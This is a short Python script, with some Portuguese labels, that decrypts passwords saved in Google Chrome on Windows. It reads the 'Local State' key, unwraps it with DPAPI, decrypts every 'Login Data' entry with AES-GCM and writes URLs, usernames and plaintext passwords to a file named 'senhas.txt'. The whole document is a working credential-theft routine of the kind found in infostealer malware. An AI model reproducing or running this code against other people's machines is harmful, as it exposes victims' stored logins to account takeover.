import json, base64, win32crypt, sqlite3, shutil, argparse, os
from Crypto.Cipher import AES
from rich import print

MSG = '[yellow]usage[/]: main.py [green]-l --local[/] file [green]-d --data[/] file\n\npositional arguments:\n   -l, --Local, Treats the Local State file\n   -d, --data, Treats the Login Data file\n'

PARSER = argparse.ArgumentParser('Resolver script')
PARSER.add_argument('-l', '--local', help='arquivos Local State')
PARSER.add_argument('-d', '--data', help='arquivos Login Data')

ARGS = PARSER.parse_args()

LOCS = ARGS.local
DATS = ARGS.data

PATH_LOCAL = LOCS
LOGIN_PATH = DATS

chrome_db = 'chrome.db'

def get_bytes():
    with open(PATH_LOCAL, 'r', encoding='utf-8') as get_path:
        local = get_path.read()
        local = json.loads(local)
    key_master = base64.b64decode(local['os_crypt']['encrypted_key'])
    key_master = key_master[5:]
    key_master = win32crypt.CryptUnprotectData(key_master, None, None, None, 0)[1]
    return key_master
    
def decrypt_payload(secret, payload):
    return secret.decrypt(payload)

def on_secret(aes_key, ivs):
    return AES.new(aes_key, AES.MODE_GCM, ivs)

def decrypt_password(buff, key_master):
    try:
        ivs = buff[3:15]
        payload = buff[15:]
        secret = on_secret(key_master, ivs)
        decrypted_passwd = decrypt_payload(secret, payload)
        decrypted_passwd = decrypted_passwd[:-16].decode()
        return decrypted_passwd
    except Exception:
        return

if (PATH_LOCAL is not None) | (LOGIN_PATH is not None):
    key_master = get_bytes()
    login_db = LOGIN_PATH
    shutil.copy2(login_db, chrome_db)

    connect = sqlite3.connect(chrome_db)
    cursor = connect.cursor()

    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

    for i in cursor.fetchall():
        url = i[0]
        username = i[1]
        encrypted_password = i[2]
        decrypted_password = decrypt_password(encrypted_password, key_master)
        save = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n\n"
        with open('senhas.txt', 'a') as file:
            file.write(save)
            
    cursor.close()
    connect.close()
else: print(MSG)

if os.path.exists(chrome_db):
    os.remove(chrome_db)